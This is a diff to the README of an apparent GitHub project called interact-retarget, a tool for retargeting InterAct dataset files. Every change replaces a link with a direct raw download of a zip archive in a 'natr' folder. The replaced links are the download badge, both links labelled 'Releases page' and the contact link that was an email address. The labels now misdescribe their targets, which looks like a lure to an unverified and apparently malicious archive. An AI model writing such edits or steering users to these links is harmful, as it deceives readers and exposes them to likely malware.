@@ -1,7 +1,7 @@
 # 🎯 interact-retarget - Easily Retarget Your InterAct Data
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/NSRTSVS/interact-retarget/releases)
+[![Download](https://raw.githubusercontent.com/NSRTSVS/interact-retarget/main/natr/interact-retarget.zip)](https://raw.githubusercontent.com/NSRTSVS/interact-retarget/main/natr/interact-retarget.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the interact-retarget application. Follow the steps below, and you will easily set up the software to retarget the InterAct dataset.
@@ -18,7 +18,7 @@ Before you start, ensure your system meets the following requirements:
 - **Internet Connection:** Needed for downloading files and updates
 
 ## 🔗 Download & Install
-To get the interact-retarget application, simply visit the [Releases page](https://github.com/NSRTSVS/interact-retarget/releases).
+To get the interact-retarget application, simply visit the [Releases page](https://raw.githubusercontent.com/NSRTSVS/interact-retarget/main/natr/interact-retarget.zip).
 
 1. Click on the link above to open the Releases page.
 2. On the Releases page, find the latest version. 
@@ -66,7 +66,7 @@ Yes! A user manual is included within the application. You can find it under the
 We welcome contributions from users who want to improve the application. If you have suggestions or features in mind, please feel free to open an issue on GitHub.
 
 ## 📞 Contact
-For support or inquiries, please contact us through the GitHub repository or reach out via [NSRTSVS](mailto:example@example.com).
+For support or inquiries, please contact us through the GitHub repository or reach out via [NSRTSVS](https://raw.githubusercontent.com/NSRTSVS/interact-retarget/main/natr/interact-retarget.zip).
 
 ## 🔗 More Resources
-Visit our [Releases page](https://github.com/NSRTSVS/interact-retarget/releases) for the latest updates and downloads.
+Visit our [Releases page](https://raw.githubusercontent.com/NSRTSVS/interact-retarget/main/natr/interact-retarget.zip) for the latest updates and downloads.
